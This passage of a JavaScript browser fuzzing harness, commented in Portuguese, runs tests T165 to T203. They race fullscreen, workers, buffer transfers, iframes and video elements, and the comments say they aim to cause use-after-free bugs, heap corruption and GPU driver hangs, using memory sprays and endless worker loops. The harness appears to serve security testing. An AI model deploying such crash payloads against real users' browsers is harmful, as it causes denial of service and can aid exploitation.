    document.body.appendChild(el);
    reqFS(el);
    
    var i = 0;
    var t = setInterval(function() {
        // Gera matrizes de transformação inválidas ou extremas
        // Isso tenta causar erro de cálculo de ponto flutuante na GPU ou driver
        var v = i * 1000;
        try {
            el.style.transform = "matrix3d(" + v + "," + v + "," + v + "," + v + "," + v + "," + v + "," + v + "," + v + "," + v + "," + v + "," + v + "," + v + "," + v + "," + v + "," + v + "," + v + ")";
            el.style.perspective = (i % 100) + "px";
        } catch(e) {}
        i++;
        
        if(i > 100) {
            clearInterval(t);
            exitFS();
            document.body.removeChild(el);
            log(">> T165: Matrix math stress done.");
        }
    }, 20);
}

function runTest166() {
    log("Iniciando T166: Adopt Node Cross-Doc FS...");
    var doc2 = document.implementation.createHTMLDocument("NewDoc");
    var el = document.createElement('div');
    el.style.background = "purple";
    document.body.appendChild(el);
    
    reqFS(el);
    
    setTimeout(function() {
        try {
            // Tenta adotar o elemento que está em Tela Cheia para outro documento
            // Isso viola a invariante de que o elemento FS deve estar no documento ativo
            doc2.adoptNode(el);
            doc2.body.appendChild(el);
            
            // Tenta sair da tela cheia no documento original, que perdeu a referência
            exitFS();
            
            var spray = new ArrayBuffer(1024*1024);
            log(">> T166: Node adoption executed.");
        } catch(e) {
            log(">> T166 Logic: " + e.message);
        }
        if(document.body.contains(el)) document.body.removeChild(el);
    }, 1000);
}

function runTest167() {
    log("Iniciando T167: Video Poster Swap Flicker...");
    var v = document.createElement('video');
    document.body.appendChild(v);
    reqFS(v);
    
    var t = setInterval(function() {
        // A troca rápida da imagem 'poster' força decodificação de imagem em thread separada
        // Enquanto o elemento está sendo renderizado em overlay de vídeo
        var b = new Blob(["junk" + Math.random()], {type: "image/jpeg"});
        var u = URL.createObjectURL(b);
        v.poster = u;
        
        // Força repaint
        v.width = (Math.random() > 0.5) ? 100 : 200;
    }, 50);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(v);
        log(">> T167: Image decoder race stopped.");
    }, 2500);
}

function runTest168() {
    log("Iniciando T168: Iframe Sandbox Flag Mutation...");
    var f = document.createElement('iframe');
    f.sandbox = "allow-same-origin allow-scripts";
    document.body.appendChild(f);
    
    f.onload = function() {
        try {
            var div = f.contentDocument.createElement('div');
            div.style.background = "yellow";
            f.contentDocument.body.appendChild(div);
            
            // Pede FS de dentro do Iframe
            if(div.webkitRequestFullscreen) div.webkitRequestFullscreen();
            
            // Remove a permissão de fullscreen do sandbox enquanto ele está ativo
            setTimeout(function() {
                f.sandbox = "allow-scripts"; // Remove allow-same-origin e fullscreen implicitamente
                // Tenta acessar o objeto window do frame agora restrito
                var w = f.contentWindow;
                var dead = w.document;
            }, 500);
        } catch(e) {}
    };
    f.src = "about:blank";
    
    setTimeout(function() {
        document.body.removeChild(f);
        log(">> T168: Sandbox mutation check.");
    }, 2000);
}

function runTest169() {
    log("Iniciando T169: Animation Frame Recursion...");
    var el = document.createElement('div');
    document.body.appendChild(el);
    reqFS(el);
    
    var running = true;
    var depth = 0;
    
    function loop() {
        if(!running) return;
        depth++;
        // Tenta empilhar chamadas RAF sem retornar ao event loop
        // Browsers limitam isso, mas em FS a prioridade pode mudar
        requestAnimationFrame(function() {
             var x = new Float32Array(1000);
             if(depth % 100 === 0) el.innerHTML = depth;
             loop();
             loop(); // Branching factor 2
        });
    }
    
    loop();
    
    setTimeout(function() {
        running = false;
        exitFS();
        document.body.removeChild(el);
        log(">> T169: RAF loop terminated. Depth reached high.");
    }, 2000);
}

function runTest170() {
    log("Iniciando T170: Multi-Element FS Toggle...");
    var div1 = document.createElement('div'); div1.id="d1"; div1.style.background="red";
    var div2 = document.createElement('div'); div2.id="d2"; div2.style.background="blue";
    document.body.appendChild(div1);
    document.body.appendChild(div2);
    
    var t = setInterval(function() {
        // Tenta pedir FS para elementos alternados rapidamente
        // O Kernel precisa trocar o buffer de overlay constantemente
        reqFS(div1);
        
        setTimeout(function() {
            reqFS(div2); // Pede FS para outro elemento sem sair do primeiro
        }, 50);
        
        setTimeout(function() {
            exitFS();
        }, 100);
        
    }, 200);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(div1);
        document.body.removeChild(div2);
        log(">> T170: Toggle thrashing done.");
    }, 3000);
}
function runTest171() {
    log("Iniciando T171: Video Track Cue Resize Bomb...");
    var v = document.createElement('video');
    document.body.appendChild(v);
    var t = v.addTextTrack("subtitles");
    t.mode = "showing";
    
    reqFS(v);
    
    var count = 0;
    var loop = setInterval(function() {
        // Adiciona centenas de legendas enquanto a tela tenta redimensionar
        // O renderizador de legendas roda em uma camada separada que precisa sincronizar com o FS
        for(var i=0; i<50; i++) {
            var cue = new VTTCue(count, count+1, "BOMB " + "X".repeat(100));
            // Muda posicionamento vertical para forçar recálculo de layout do overlay
            cue.line = i % 100; 
            t.addCue(cue);
        }
        
        // Remove legendas antigas para causar churn de memória
        if(t.cues.length > 500) {
            for(var k=0; k<200; k++) t.removeCue(t.cues[0]);
        }
        
        count++;
        if(count > 100) {
            clearInterval(loop);
            exitFS();
            document.body.removeChild(v);
            log(">> T171: Subtitle layer stress done.");
        }
    }, 50);
}

function runTest172() {
    log("Iniciando T172: Canvas ReadPixels Sync Lock...");
    var c = document.createElement('canvas');
    c.width = 1920; c.height = 1080;
    document.body.appendChild(c);
    var ctx = c.getContext('2d');
    ctx.fillStyle = "blue";
    ctx.fillRect(0,0,1920,1080);
    
    reqFS(c);
    
    var loop = setInterval(function() {
        // Tenta ler a memória da GPU (síncrono e lento) durante a transição de janela
        // Isso tenta travar o driver de vídeo enquanto ele está trocando buffers
        var x = ctx.getImageData(0,0, 500, 500);
        
        // Modifica o canvas imediatamente após ler
        ctx.fillStyle = "rgb(" + Math.random()*255 + ",0,0)";
        ctx.fillRect(0,0,100,100);
        
        // Gera pressão de memória JS
        var junk = new Uint32Array(x.data.buffer);
    }, 30);
    
    setTimeout(function() {
        clearInterval(loop);
        exitFS();
        document.body.removeChild(c);
        log(">> T172: GPU Readback stress finished.");
    }, 3000);
}

function runTest173() {
    log("Iniciando T173: Object Tag Fallback Switch...");
    var obj = document.createElement('object');
    // Tipo inválido força o navegador a tentar carregar plugin e falhar para fallback
    obj.type = "application/x-shockwave-flash"; 
    obj.innerHTML = "<div style='background:red;width:100%;height:100%'>FALLBACK</div>";
    document.body.appendChild(obj);
    
    reqFS(obj);
    
    var loop = setInterval(function() {
        // Troca o tipo do objeto repetidamente
        // Força o navegador a destruir e recriar o contexto de renderização dentro do FS
        obj.type = (Math.random() > 0.5) ? "application/pdf" : "image/png";
        
        // Modifica o conteúdo de fallback
        obj.innerHTML = "<span>" + Math.random() + "</span>";
        
        // Força reflow
        var h = obj.scrollHeight;
    }, 100);
    
    setTimeout(function() {
        clearInterval(loop);
        exitFS();
        document.body.removeChild(obj);
        log(">> T173: Plugin container stress done.");
    }, 3000);
}

function runTest174() {
    log("Iniciando T174: CSS Clip-Path Geometry Trap...");
    var el = document.createElement('div');
    el.style.width = "100%"; el.style.height = "100%";
    el.style.background = "orange";
    document.body.appendChild(el);
    reqFS(el);
    
    var pts = [];
    for(var i=0; i<100; i++) pts.push("50% 50%");
    
    var loop = setInterval(function() {
        // Atualiza geometria complexa de recorte a cada frame
        // Isso é extremamente custoso para a GPU rasterizar em 1080p
        for(var i=0; i<pts.length; i++) {
            pts[i] = (Math.random()*100) + "% " + (Math.random()*100) + "%";
        }
        el.style.clipPath = "polygon(" + pts.join(',') + ")";
        
        // Adiciona transform 3D para complicar a composição
        el.style.transform = "rotateX(" + Math.random()*360 + "deg)";
    }, 40);
    
    setTimeout(function() {
        clearInterval(loop);
        exitFS();
        document.body.removeChild(el);
        log(">> T174: Geometry clipping stress done.");
    }, 3000);
}

function runTest175() {
    log("Iniciando T175: Iframe Recursive FS Request...");
    var container = document.createElement('div');
    document.body.appendChild(container);
    var depth = 0;
    
    function createFrame(parent) {
        depth++;
        if(depth > 10) return;
        
        var f = document.createElement('iframe');
        parent.appendChild(f);
        f.onload = function() {
            try {
                var d = f.contentDocument;
                var div = d.createElement('div');
                div.style.background = "green";
                d.body.appendChild(div);
                
                // Iframe pede FS
                if(div.webkitRequestFullscreen) div.webkitRequestFullscreen();
                
                // Cria recursão
                createFrame(d.body);
            } catch(e) {}
        };
    }
    
    // Inicia a cadeia
    createFrame(container);
    
    setTimeout(function() {
        document.body.removeChild(container);
        exitFS(); // Tenta limpar estado global
        log(">> T175: Recursive frame FS chain stopped.");
    }, 3000);
}

function runTest176() {
    log("Iniciando T176: Deep Clone Node Append Race...");
    var el = document.createElement('div');
    el.id = "fs-root";
    // Cria árvore pesada
    el.innerHTML = "<div><span>Text</span></div>".repeat(1000);
    document.body.appendChild(el);
    
    reqFS(el);
    
    var loop = setInterval(function() {
        // Clona a árvore inteira (operação pesada na memória)
        var clone = el.cloneNode(true);
        
        // Adiciona ao elemento que já está em FS, forçando repaint massivo
        el.appendChild(clone);
        
        // Remove imediatamente para estressar o GC
        setTimeout(function() {
            el.innerHTML = ""; 
        }, 10);
        
        // Aloca array buffer para competir por RAM
        var spray = new ArrayBuffer(1024 * 1024);
    }, 100);
    
    setTimeout(function() {
        clearInterval(loop);
        exitFS();
        document.body.removeChild(el);
        log(">> T176: DOM Tree cloning stress done.");
    }, 3000);
}

function runTest177() {
    log("Iniciando T177: Selection Range Cross-Boundary...");
    var fsDiv = document.createElement('div');
    fsDiv.textContent = "INSIDE ".repeat(500);
    document.body.appendChild(fsDiv);
    
    var outDiv = document.createElement('div');
    outDiv.textContent = "OUTSIDE ".repeat(500);
    document.body.appendChild(outDiv);
    
    var s = window.getSelection();
    
    reqFS(fsDiv);
    
    var loop = setInterval(function() {
        // Cria uma seleção que começa dentro do elemento FS e termina fora dele
        // Quando o navegador isola o elemento FS, a renderização do 'outDiv' muda
        // Isso pode confundir o cálculo de highlight do texto
        var r = document.createRange();
        try {
            r.setStart(fsDiv.firstChild, Math.floor(Math.random() * 100));
            r.setEnd(outDiv.firstChild, Math.floor(Math.random() * 100));
            s.removeAllRanges();
            s.addRange(r);
            
            // Modifica o DOM afetado pela seleção
            fsDiv.style.fontSize = (Math.random() * 20 + 10) + "px";
        } catch(e) {}
    }, 50);
    
    setTimeout(function() {
        clearInterval(loop);
        exitFS();
        document.body.removeChild(fsDiv);
        document.body.removeChild(outDiv);
        log(">> T177: Selection boundary stress done.");
    }, 3000);
}

function runTest178() {
    log("Iniciando T178: Table Border Collapse Recalc...");
    var t = document.createElement('table');
    t.style.borderCollapse = "collapse";
    t.style.width = "100%"; t.style.height = "100%";
    t.style.background = "white";
    document.body.appendChild(t);
    
    // Cria tabela gigante
    for(var r=0; r<50; r++) {
        var row = t.insertRow();
        for(var c=0; c<20; c++) {
            var cell = row.insertCell();
            cell.style.border = "1px solid black";
            cell.textContent = "X";
        }
    }
    
    reqFS(t);
    
    var loop = setInterval(function() {
        // Alterna border-collapse e muda larguras de borda aleatoriamente
        // O algoritmo de colapso de borda é computacionalmente caro (O(n^2) em alguns casos)
        t.style.borderCollapse = (t.style.borderCollapse == "collapse") ? "separate" : "collapse";
        
        var rows = t.rows;
        var rIdx = Math.floor(Math.random() * 50);
        rows[rIdx].cells[0].style.borderWidth = (Math.random() * 10) + "px";
        
        // Força reflow síncrono
        var x = t.offsetWidth;
    }, 50);
    
    setTimeout(function() {
        clearInterval(loop);
        exitFS();
        document.body.removeChild(t);
        log(">> T178: Table layout stress done.");
    }, 3000);
}

function runTest179() {
    log("Iniciando T179: Scroll Into View Interrupt...");
    var container = document.createElement('div');
    container.style.overflow = "hidden";
    container.style.height = "100vh";
    document.body.appendChild(container);
    
    var target = document.createElement('div');
    target.style.marginTop = "5000px"; // Longe da tela
    target.style.width = "100px"; target.style.height = "100px";
    target.style.background = "red";
    container.appendChild(target);
    
    reqFS(container);
    
    var loop = setInterval(function() {
        // Pede para scrolar até o elemento
        target.scrollIntoView({behavior: "smooth"});
        
        // Imediatamente move o elemento para outro lugar do DOM ou muda layout
        // Quebra a animação de scroll suave do compositor
        setTimeout(function() {
            target.style.marginTop = (Math.random() * 5000) + "px";
            container.scrollTop = 0; // Força reset
        }, 10);
        
    }, 100);
    
    setTimeout(function() {
        clearInterval(loop);
        exitFS();
        document.body.removeChild(container);
        log(">> T179: Scroll animation interrupt done.");
    }, 3000);
}

function runTest180() {
    log("Iniciando T180: Display None Layout Flush...");
    var el = document.createElement('div');
    el.style.background = "yellow";
    el.innerHTML = "<div><span>Complex</span></div>".repeat(500);
    document.body.appendChild(el);
    
    reqFS(el);
    
    var loop = setInterval(function() {
        // Esconde o elemento raiz do FS
        // Isso tecnicamente deveria cancelar o FS, mas em alguns motores causa estado inconsistente
        el.style.display = "none";
        
        // Lê propriedade de layout forçando recálculo em elemento invisível
        var h = el.scrollHeight;
        
        // Mostra de novo
        el.style.display = "block";
        
        // Adiciona garbage
        var junk = document.createElement('span');
        el.appendChild(junk);
    }, 50);
    
    setTimeout(function() {
        clearInterval(loop);
        exitFS();
        document.body.removeChild(el);
        log(">> T180: Display toggling stress done.");
    }, 3000);
}
function runTest181() {
    log("Iniciando T181: Fullscreen + History Flood...");
    var el = document.createElement('div');
    el.style.background = "red";
    document.body.appendChild(el);
    
    reqFS(el);
    
    var count = 0;
    var t = setInterval(function() {
        // Combina troca de buffer de vídeo (FS) com serialização de estado (History)
        try {
            var state = { id: count, junk: new Array(1000).join("x") };
            history.pushState(state, "fs"+count, "/?s="+count);
            
            if(count % 10 === 0) {
                // Força atualização da URL bar (que fica oculta em FS)
                location.hash = "#" + Math.random();
            }
            count++;
        } catch(e) {}
        
        if(count > 200) {
            clearInterval(t);
            exitFS();
            document.body.removeChild(el);
            history.pushState(null, null, "/");
            log(">> T181: UI Overlay/History race finished.");
        }
    }, 20);
}

function runTest182() {
    log("Iniciando T182: Worker + MessageChannel Port UAF...");
    var mc = new MessageChannel();
    var port = mc.port1;
    
    var b = new Blob(["self.onmessage=function(e){var p=e.data; p.postMessage('ping'); p.close();}"], {type:'application/javascript'});
    var w = new Worker(URL.createObjectURL(b));
    
    var t = setInterval(function() {
        try {
            // Cria canais descartáveis
            var tempCh = new MessageChannel();
            // Transfere porta para worker
            w.postMessage(tempCh.port2, [tempCh.port2]);
            
            // Tenta fechar o worker enquanto a porta está em trânsito
            if(Math.random() > 0.8) {
                w.terminate();
                w = new Worker(URL.createObjectURL(b)); // Respawn
            }
            
            // Tenta usar a outra ponta localmente
            tempCh.port1.postMessage("test");
        } catch(e) {}
    }, 10);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T182: Port ownership race stopped.");
    }, 3000);
}

function runTest183() {
    log("Iniciando T183: Worker + Buffer Transfer + GC Race...");
    var b = new Blob(["self.onmessage=function(e){var ab=e.data; self.close();}"], {type:'js'});
    var w = new Worker(URL.createObjectURL(b));
    var ab = new ArrayBuffer(1024 * 1024 * 5); // 5MB
    
    try {
        // Transfere propriedade (neutering)
        w.postMessage(ab, [ab]);
        
        // Remove referência local imediatamente
        ab = null;
        
        // Força pressão de memória para disparar GC enquanto o worker processa a mensagem
        var spray = [];
        for(var i=0; i<10000; i++) spray.push({a:1});
        
        // Tenta acessar a memória antiga via DataView fantasma (se sobrar ref)
        // Em JS puro é difícil, mas o objetivo é corromper o heap do allocator
        log(">> T183: Transfer & GC cycle triggered.");
    } catch(e) { log(">> T183 Error: " + e.message); }
}

function runTest184() {
    log("Iniciando T184: Video + Fullscreen + DOM Removal...");
    var v = document.createElement('video');
    document.body.appendChild(v);
    
    reqFS(v);
    
    setTimeout(function() {
        // O elemento está em tela cheia (overlay ativo)
        // Removemos do DOM abruptamente
        if(v.parentNode) v.parentNode.removeChild(v);
        
        // Imediatamente tentamos manipular o elemento 'zumbi'
        v.src = "junk.mp4";
        
        // E chamamos exitFS globalmente, o que força o kernel a restaurar janela
        // de um elemento que não existe mais no documento
        exitFS();
        
        var junk = new Uint32Array(0x1000).fill(0xDEADBEEF);
        log(">> T184: Video surface detach executed.");
    }, 500);
}

function runTest185() {
    log("Iniciando T185: TypedArray + Worker Terminate Race...");
    var code = "self.onmessage = function(e) { var v = new Uint8Array(e.data); while(1) v[0]=1; }";
    var blob = new Blob([code], {type: 'text/javascript'});
    
    var t = setInterval(function() {
        var w = new Worker(URL.createObjectURL(blob));
        var ab = new ArrayBuffer(1024 * 1024);
        
        w.postMessage(ab, [ab]); // Transfere
        
        // Mata o worker enquanto ele escreve na memória
        // Tenta pegar o ponteiro de memória de volta para userland (UAF)
        w.terminate();
        
        // Tenta realocar no mesmo slot
        var reclaim = new ArrayBuffer(1024 * 1024);
        var view = new Uint8Array(reclaim);
        if(view[0] === 1) log("!! MEMORY LEAK DETECTED !!");
        
    }, 50);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T185: Buffer ownership race stopped.");
    }, 3000);
}

function runTest186() {
    log("Iniciando T186: History + GC + Iframe Nav...");
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    
    var huge = { data: new Array(10000).fill("A") };
    
    f.onload = function() {
        try {
            var w = f.contentWindow;
            // Push state grande dentro do iframe
            w.history.pushState(huge, "t", "v");
            
            // Navega iframe para destruir contexto JS
            f.src = "about:blank";
            
            // Tenta forçar GC do objeto de estado antigo
            var spray = new Array(5000).fill(1);
            
            // Volta no histórico (Browser deve deserializar objeto salvo)
            setTimeout(function() { w.history.back(); }, 100);
        } catch(e) {}
    };
    f.src = "about:blank";
    
    setTimeout(function() {
        if(document.body.contains(f)) document.body.removeChild(f);
        log(">> T186: Serialized state restoration test.");
    }, 2000);
}

function runTest187() {
    log("Iniciando T187: Worker + TextEncoder Fragmentation...");
    var code = `
        var enc = new TextEncoder();
        self.onmessage = function(e) {
            // Encode massivo para fragmentar heap da thread
            for(var i=0; i<1000; i++) enc.encode(e.data + i);
            postMessage("done");
        }
    `;
    var w = new Worker(URL.createObjectURL(new Blob([code], {type:'js'})));
    var str = "X".repeat(1024 * 10);
    
    var t = setInterval(function() {
        w.postMessage(str);
    }, 10);
    
    w.onmessage = function() {
        // Main thread também aloca para competir por recursos globais
        var x = new ArrayBuffer(1024*100);
    };
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T187: Thread heap fragmentation done.");
    }, 3000);
}

function runTest188() {
    log("Iniciando T188: Canvas Resize + Fullscreen Toggle...");
    var c = document.createElement('canvas');
    document.body.appendChild(c);
    var ctx = c.getContext('2d');
    
    var t = setInterval(function() {
        // Resize do canvas limpa o buffer
        c.width = Math.random() * 2000;
        c.height = Math.random() * 1000;
        
        ctx.fillStyle = "red";
        ctx.fillRect(0,0,c.width, c.height);
        
        // Tenta entrar/sair de FS durante o resize
        if(Math.random() > 0.5) reqFS(c);
        else exitFS();
        
    }, 100);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(c);
        log(">> T188: Graphics pipeline stress done.");
    }, 3000);
}

function runTest189() {
    log("Iniciando T189: Nested Worker + Transfer Chain Kill...");
    // Worker 1 cria Worker 2
    var code2 = "self.onmessage=function(e){var d=e.data; setInterval(()=>{d[0]++;},0);}";
    var blob2 = new Blob([code2], {type:'js'});
    var url2 = URL.createObjectURL(blob2);
    
    var code1 = `
        var w2 = new Worker('${url2}');
        self.onmessage = function(e) {
            // Repassa buffer para worker filho
            w2.postMessage(e.data, [e.data]);
        }
    `;
    var blob1 = new Blob([code1], {type:'js'});
    var w1 = new Worker(URL.createObjectURL(blob1));
    
    var ab = new Uint8Array(1024*1024);
    
    try {
        w1.postMessage(ab.buffer, [ab.buffer]); // Envia para W1 -> W2
        
        setTimeout(function() {
            // Mata W1 (pai). W2 (filho) deve morrer. Buffer deve ser liberado.
            w1.terminate();
            
            // Aloca lixo para sobrescrever a memória do buffer
            var junk = new Uint32Array(1024*1024/4).fill(0xCAFEBABE);
            log(">> T189: Worker chain killed.");
        }, 500);
    } catch(e) { log(">> T189 Error: " + e.message); }
}

function runTest190() {
    log("Iniciando T190: MEDIA + HISTORY + FULLSCREEN COMBO...");
    var v = document.createElement('video');
    document.body.appendChild(v);
    
    // 1. Entra FS
    reqFS(v);
    
    setTimeout(function() {
        // 2. Empurra estado no history referenciando o vídeo (via object URL ou state)
        history.pushState({v: "video_active"}, "fs", "/fs");
        
        // 3. Modifica vídeo
        v.src = "foo.mp4";
        
        // 4. Navega e volta rapidamente (History thrashing)
        history.back();
        history.forward();
        
        // 5. Sai do FS no meio da navegação
        exitFS();
        
        // 6. Destrói vídeo
        document.body.removeChild(v);
        
        var fill = new Array(1000).fill("MEMORY");
        log(">> T190: The Combo executed.");
    }, 500);
}
function runTest191() {
    log("Iniciando T191: Worker Message Loopback UAF...");
    // Cria um worker que apenas ecoa a mensagem recebida
    var b = new Blob(["self.onmessage=function(e){postMessage(e.data);}"], {type:'js'});
    var w = new Worker(URL.createObjectURL(b));
    var mc = new MessageChannel();
    
    // Envia a porta 1 para o worker, que a devolve
    w.postMessage("init", [mc.port1]);
    
    w.onmessage = function(e) {
        // Quando a porta volta, tentamos usá-la imediatamente
        // enquanto fechamos a outra ponta (port2)
        try {
            var p = e.data; // Se for objeto transferido
            if(p && p.postMessage) {
                p.postMessage("crash");
                mc.port2.close(); // Fecha o par enquanto o kernel processa a msg
            }
        } catch(z) {}
    };
    
    // Dispara ciclo rápido
    var t = setInterval(function() {
        w.postMessage("ping");
    }, 10);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T191: IPC loop race stop.");
    }, 3000);
}

function runTest192() {
    log("Iniciando T192: TypedArray Transfer Neuter Race...");
    var ab = new ArrayBuffer(1024 * 1024 * 10); // 10MB
    var view = new Uint8Array(ab);
    view[0] = 0xAA;
    
    var b = new Blob(["self.onmessage=function(e){var v=new Uint8Array(e.data); self.close();}"], {type:'js'});
    var w = new Worker(URL.createObjectURL(b));
    
    try {
        // Tenta acessar o array logo após transferir a propriedade (neutering)
        // Race condition: O JS engine pode permitir acesso antes da flag de neuter ser setada
        w.postMessage(ab, [ab]);
        
        // Acesso ilegal pós-transferência
        var check = view[0];
        log("!! T192: Accessed neutered buffer: " + check);
    } catch(e) {
        log(">> T192 Blocked (Correct behavior): " + e.message);
    }
    
    // Tenta realocar na mesma região
    var ab2 = new ArrayBuffer(1024 * 1024 * 10);
}

function runTest193() {
    log("Iniciando T193: Shared Blob URL Thread Kill...");
    var data = new Uint8Array(1024*1024).fill(0xCC);
    var blob = new Blob([data]);
    var url = URL.createObjectURL(blob);
    
    var workers = [];
    var code = "self.onmessage=function(e){ var x = new XMLHttpRequest(); x.open('GET', e.data, false); x.send(); }";
    var wb = new Blob([code], {type:'js'});
    
    for(var i=0; i<10; i++) {
        var w = new Worker(URL.createObjectURL(wb));
        w.postMessage(url); // Todos tentam ler o mesmo Blob URL
        workers.push(w);
    }
    
    setTimeout(function() {
        // Revoga a URL enquanto 10 threads tentam ler
        URL.revokeObjectURL(url);
        // Mata os workers abruptamente
        workers.forEach(w => w.terminate());
        log(">> T193: Blob URL race executed.");
    }, 100);
}

function runTest194() {
    log("Iniciando T194: Worker Garbage Storm PostMessage...");
    var code = `
        self.onmessage = function(e) {
            // Cria lixo massivo ao receber msg
            var junk = [];
            for(var i=0; i<10000; i++) junk.push({a: i, b: new Uint8Array(100)});
            postMessage("done");
        }
    `;
    var w = new Worker(URL.createObjectURL(new Blob([code], {type:'js'})));
    var ab = new ArrayBuffer(1024 * 1024); // 1MB payload
    
    var t = setInterval(function() {
        // Envia buffers rapidamente para encher a fila de mensagens do worker
        // O Worker está ocupado com GC, fila cresce no Kernel
        w.postMessage(ab); // Clone, não transfer
    }, 5);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T194: GC Storm finished.");
    }, 3000);
}

function runTest195() {
    log("Iniciando T195: Message Port Clone Death...");
    var mc = new MessageChannel();
    var p1 = mc.port1;
    
    try {
        // Tenta clonar a porta recursivamente via postMessage estruturado
        var deep = [];
        for(var i=0; i<100; i++) deep.push(p1);
        
        window.postMessage(deep, "*", deep); // Transfere a mesma porta múltiplas vezes?
        
        log(">> T195: Multi-transfer attempted.");
    } catch(e) {
        log(">> T195 Logic Error: " + e.message);
    }
}

function runTest196() {
    log("Iniciando T196: Fullscreen History Back Flood...");
    var el = document.createElement('div');
    el.style.background = "green";
    document.body.appendChild(el);
    reqFS(el);
    
    // Enche o histórico
    for(var i=0; i<50; i++) history.pushState({i:i}, "s"+i, "/"+i);
    
    var t = setInterval(function() {
        // Volta no histórico rapidamente enquanto em FS
        // Cada 'back' tenta restaurar o scroll e estado da página
        history.back();
        
        // Tenta manipular o elemento FS durante a navegação
        el.style.display = (el.style.display == "none") ? "block" : "none";
    }, 50);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(el);
        log(">> T196: History nav while FS done.");
    }, 3000);
}

function runTest197() {
    log("Iniciando T197: Video Fullscreen Detach Panic...");
    var v = document.createElement('video');
    v.src = "blob:null/void"; // Fonte inválida
    document.body.appendChild(v);
    
    reqFS(v);
    
    setTimeout(function() {
        // Remove vídeo do DOM
        document.body.removeChild(v);
        // Tenta acionar play em elemento desconectado e em FS
        try { v.play(); } catch(e){}
        // Sai do FS (Kernel tenta restaurar janela do elemento nulo)
        exitFS();
        
        // Aloca textura para sobrescrever framebuffer
        var c = document.createElement('canvas');
        c.width=1920; c.height=1080;
        c.getContext('2d').fillRect(0,0,1,1);
        
        log(">> T197: Video detach sequence run.");
    }, 500);
}

function runTest198() {
    log("Iniciando T198: Canvas Context Loss FS Toggle...");
    var c = document.createElement('canvas');
    c.width = 1000; c.height = 1000;
    document.body.appendChild(c);
    var ctx = c.getContext('2d');
    
    var state = false;
    var t = setInterval(function() {
        // Desenha
        ctx.fillStyle = "blue";
        ctx.fillRect(0,0,1000,1000);
        
        // Toggle FS
        if(!state) { reqFS(c); state=true; }
        else { exitFS(); state=false; }
        
        // Força perda de contexto simulada redimensionando para zero
        c.width = 0;
        c.width = 1000;
        
    }, 200);
    
    setTimeout(function() {
        clearInterval(t);
        exitFS();
        document.body.removeChild(c);
        log(">> T198: Canvas context thrashing.");
    }, 3000);
}

function runTest199() {
    log("Iniciando T199: Audio Context Visualizer Crash...");
    if(!window.AudioContext && !window.webkitAudioContext) return;
    var ac = new (window.AudioContext || window.webkitAudioContext)();
    
    var osc = ac.createOscillator();
    var ana = ac.createAnalyser();
    osc.connect(ana);
    osc.start();
    
    var c = document.createElement('canvas');
    document.body.appendChild(c);
    reqFS(c);
    
    var data = new Uint8Array(ana.frequencyBinCount);
    var running = true;
    
    function draw() {
        if(!running) return;
        ana.getByteFrequencyData(data);
        // Loop de renderização pesado
        var ctx = c.getContext('2d');
        ctx.fillRect(0,0,100,100);
        requestAnimationFrame(draw);
        
        // Tenta fechar o contexto de áudio enquanto renderiza em FS
        if(Math.random() > 0.98) {
            ac.close().then(() => { ac = new (window.AudioContext || window.webkitAudioContext)(); });
        }
    }
    draw();
    
    setTimeout(function() {
        running = false;
        exitFS();
        osc.stop();
        document.body.removeChild(c);
        log(">> T199: Audio visualizer stress.");
    }, 3000);
}

function runTest200() {
    log("Iniciando T200: THE VOID (STATE DESYNC)...");
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    
    f.onload = function() {
        var w = f.contentWindow;
        var d = f.contentDocument;
        var div = d.createElement('div');
        div.style.background = "black";
        d.body.appendChild(div);
        
        // 1. Pede FS dentro do Iframe
        if(div.webkitRequestFullscreen) div.webkitRequestFullscreen();
        
        setTimeout(function() {
            // 2. Main thread navega o iframe para longe
            f.src = "about:blank";
            
            // 3. Push state no top frame simultaneamente
            history.pushState(null, null, "/void");
            
            // 4. Cria Worker para comer CPU
            var blob = new Blob(["while(1);"], {type:'js'});
            var worker = new Worker(URL.createObjectURL(blob));
            
            // 5. Destrói o iframe
            setTimeout(() => {
                document.body.removeChild(f);
                worker.terminate();
                log(">> T200: Desync sequence complete.");
            }, 500);
        }, 200);
    };
    f.src = "about:blank";
}
function runTest201() {
    log("Iniciando T201: Worker Terminate Buffer UAF...");
    var ab = new ArrayBuffer(1024 * 1024 * 2);
    var view = new Uint8Array(ab);
    view[0] = 0xFF;
    
    var b = new Blob(["self.onmessage=function(e){var d=e.data; while(1);}"], {type:'js'});
    
    var t = setInterval(function() {
        var w = new Worker(URL.createObjectURL(b));
        
        // Race: Transfere ownership, depois mata o worker, depois tenta ler via view antiga
        // Se o cleanup do worker falhar em invalidar a view na main thread instantaneamente
        w.postMessage(ab, [ab]);
        w.terminate();
        
        try {
            if(view.byteLength > 0) {
                var leak = view[0]; 
            }
        } catch(e) {}
        
        ab = new ArrayBuffer(1024 * 1024 * 2);
        view = new Uint8Array(ab);
    }, 20);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T201: Terminate race finished.");
    }, 3000);
}

function runTest202() {
    log("Iniciando T202: Nested Worker Transfer Chain...");
    var codeInner = "self.onmessage=function(e){postMessage(e.data,[e.data]);}";
    var blobInner = new Blob([codeInner], {type:'js'});
    var urlInner = URL.createObjectURL(blobInner);
    
    var codeOuter = `var w=new Worker('${urlInner}'); self.onmessage=function(e){w.postMessage(e.data,[e.data]);}`;
    var blobOuter = new Blob([codeOuter], {type:'js'});
    
    var w = new Worker(URL.createObjectURL(blobOuter));
    var ab = new Uint8Array(1024 * 512);
    
    var t = setInterval(function() {
        try {
            // Cria buffer, transfere para Pai -> Filho -> Pai
            var buf = new ArrayBuffer(1024);
            w.postMessage(buf, [buf]);
        } catch(e) {}
    }, 5);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        log(">> T202: Transfer chain stress done.");
    }, 3000);
}

function runTest203() {
    log("Iniciando T203: Shared Blob URL Revoke Storm...");
    var data = new Uint8Array(1024 * 64).fill(0x41);
